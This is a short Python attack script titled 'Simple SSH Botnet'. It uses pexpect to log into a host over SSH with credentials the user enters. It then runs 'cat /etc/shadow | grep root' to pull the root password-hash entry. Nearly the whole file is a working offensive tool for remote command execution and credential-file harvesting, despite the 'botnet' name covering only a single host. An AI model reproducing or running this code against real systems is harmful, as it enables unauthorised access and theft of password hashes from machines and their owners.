################################################################################
#                       Simple SSH Botnet                                      #
#                                                                              #
#                                                                              #
#                                                                              #
#                    #author: Mark72                                           #
################################################################################

import pexpect
import optparse

PROMPT = ['#', '>>>', '>']

def send_command(child, cmd):
	child.sendline(cmd)
	child.expect(PROMPT)

	print (child.before)

def connect(user, host, password):
	ssh_newkey = "Do You Want To Continue Initiating A Connection ???..."
	connStr = 'ssh ' + user + '@' + host
	child = pexpect.spawn(connStr)
	ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])

	if ret == 0:
		print ("[-] Connection Error!!!..")
		return

	if ret == 1:
		child.sendline('yes')
		ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])

		if ret == 0:
			print ("[-] Connection Error!!!...")
			return

	child.sendline(password)
	child.expect(PROMPT)
	return child

def main():
	print ("@----------------------------<<<<<<---->>>>>>------------------------------------@")
	print (" -------------******--^^^^-<<-[[[[SSH BOT]]]]->>-^^^^--******--------------------")
	print ("@----------------------------<<<<<<---->>>>>>-----------------------------@marK--@")
	host = input("              [_] Enter Host To Connect: ")
	user = input ("              [U] Input Username..: ")
	password = input ("              [P] Input Password..: ")
	child = connect(user, host, password)
	send_command(child, 'cat /etc/shadow | grep root')

if __name__ == '__main__':
	main()
